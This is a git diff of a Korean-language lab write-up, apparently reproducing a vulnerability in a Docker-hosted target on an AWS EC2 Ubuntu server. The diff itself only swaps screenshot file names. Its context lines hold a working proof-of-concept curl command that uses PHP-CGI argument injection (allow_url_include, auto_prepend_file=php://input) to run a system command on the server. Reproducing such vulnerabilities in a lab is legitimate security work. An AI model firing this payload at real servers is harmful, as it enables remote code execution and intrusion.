@@ -15,7 +15,7 @@
 - 따라서 AWS의 EC2를 통해 우분투 서버를 생성하여 진행하였다.
 - 인스턴스를 생성하고 실행 환경을 구성한 후, docker compose up -d 명령어를 사용하였더니, 다음과 같이 접속이 가능하였다.
 
-![기본 접속 화면](1.png)
+![기본 접속 화면](4.png)
 
 - 처음에 접속이 되지 않고 무한 로딩이 걸려 AWS의 방화벽을 열어주는 작업을 진행해야 했다.
 
@@ -29,7 +29,7 @@
 `curl -s -X POST "http://13.125.60.214:8080/index.php?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input" \-d "<?php system('id'); ?>"`
 
 ### **결과**
-![PoC 실행 결과 화면](2.png)
+![PoC 실행 결과 화면](5.png)
 
 ### 재현 절차
 
